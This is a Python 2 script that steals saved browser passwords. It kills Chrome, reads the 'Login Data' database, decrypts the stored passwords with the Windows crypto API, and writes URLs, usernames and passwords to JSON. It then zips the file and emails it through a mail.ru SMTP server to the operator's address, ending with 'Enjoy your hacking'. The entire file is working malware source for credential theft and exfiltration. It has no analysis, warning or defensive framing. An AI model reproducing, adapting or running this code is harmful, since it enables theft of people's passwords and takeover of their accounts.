import os,sys,sqlite3,json,getpass,subprocess,time
import socket,tempfile,zipfile
from threading import Thread
from SocketServer import ThreadingMixIn
import smtplib
from email.MIMEMultipart import MIMEMultipart
from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from email.Utils import COMMASPACE, formatdate
from email import Encoders
import datetime

try:
    import win32crypt
except:
    pass
subprocess.Popen('TASKKILL /IM chrome.exe', shell=True)
def main():
    info_list = []
    path = getpath()
    try:
        connection = sqlite3.connect(path + "Login Data")
        with connection:
            cursor = connection.cursor()
            v = cursor.execute(
                'SELECT action_url, username_value, password_value FROM logins')
            value = v.fetchall() 
        for information in value:
            if os.name == 'nt':
                password = win32crypt.CryptUnprotectData(
                    information[2], None, None, None, 0)[1]
                if password:
                    info_list.append({
                        'origin_url': information[0],
                        'username': information[1],
                        'password': str(password)
                    })
            elif os.name == 'posix':
                info_list.append({
                    'origin_url': information[0],
                    'username': information[1],
                    'password': information[2]
                })
                
    except:
        print "error"   
    return info_list
user_name=getpass.getuser()
path = tempfile.mkdtemp()
p2=path+"\\passs.json"

def getpath():
    if os.name == "nt":
        PathName = os.getenv('localappdata') + \
            '\\Google\\Chrome\\User Data\\Default\\'
        if (os.path.isdir(PathName) == False):
            print('')
            sys.exit(0)
    return PathName
def output_json(info):
	try:
		with open(p2, 'w') as json_file:
			json.dump({'password_items':info},json_file)
			print("")
	except EnvironmentError:
		print('')

if __name__ == '__main__':
    
    output_json(main())


zip_zip=zipfile.ZipFile(path+"\jsonf.zip", 'w')
zip_zip.write(p2)
zip_zip.close()
zipfile_path=path+"\jsonf.zip"



smtpUser = 'enter russian mail'
smtpPass = 'enter password of russian mail'

toAdd = ''
fromAdd = smtpUser

today = datetime.date.today()

subject  = 'Data File 01 %s' % today.strftime('%Y %b %d')
header = 'To :' + toAdd + '\n' + 'From : ' + fromAdd + '\n' + 'Subject : ' + subject + '\n'
body = 'This is a data file on %s' % today.strftime('%Y %b %d')

attach = 'Data on %s.jpg' % today.strftime('%Y-%m-%d')

def sendMail(to, subject, text, files=[]):
    assert type(to)==list
    assert type(files)==list

    msg = MIMEMultipart()
    msg['From'] = smtpUser
    msg['To'] = COMMASPACE.join(to)
    msg['Date'] = formatdate(localtime=True)
    msg['Subject'] = subject

    msg.attach( MIMEText(text) )

    for file in files:
        part = MIMEBase('application', "octet-stream")
        part.set_payload( open(file,"rb").read() )
        Encoders.encode_base64(part)
        part.add_header('Content-Disposition', 'attachment; filename="%s"'
                       % os.path.basename(file))
        msg.attach(part)

    server = smtplib.SMTP('smtp.mail.ru:587')
    server.ehlo_or_helo_if_needed()
    server.starttls()
    server.ehlo_or_helo_if_needed()
    server.login(smtpUser,smtpPass)
    server.sendmail(smtpUser, to, msg.as_string())

    print 'Done ^__^ '

    server.quit()


sendMail( ['enter your email that you want to receive password on it '], "this file from "+user_name, "extract passwords done ^__^ , Enjoy your hacking ", [zipfile_path] )

